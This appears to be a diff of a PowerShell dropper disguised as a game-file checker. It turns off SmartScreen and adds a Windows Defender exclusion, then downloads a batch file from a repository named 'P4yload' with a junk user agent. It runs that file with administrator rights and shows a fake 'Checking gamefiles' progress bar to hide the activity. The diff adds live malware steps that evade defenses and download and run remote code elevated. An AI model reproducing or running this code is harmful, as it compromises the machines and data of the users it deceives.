@@ -22,15 +22,12 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Smart
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureSmartScreen' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 
-$url = "https://github.com/P4yload/WebCheck/raw/main/Check.exe"
-$outputFile = "C:\Users\ccmmmd.exe"
+$url = "https://github.com/P4yload/WebCheck1/raw/main/start.bat"
+$outputFile = "C:\Users\ccmmmd.bat"
 Add-MpPreference -ExclusionPath $outputFile
 Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"
-#$webClient = New-Object System.Net.WebClient
-#$webClient.Headers.Add("User-Agent", "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE")
-#$webClient.DownloadFile($url, $outputFile)
 
-Start-Process -FilePath $outputFile -Verb RunAs
+Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$outputFile`"" -Verb RunAs
 
 for ($i = 1; $i -le 100; $i++) {
     Write-Host -NoNewline ("Checking gamefiles: $i%`r")
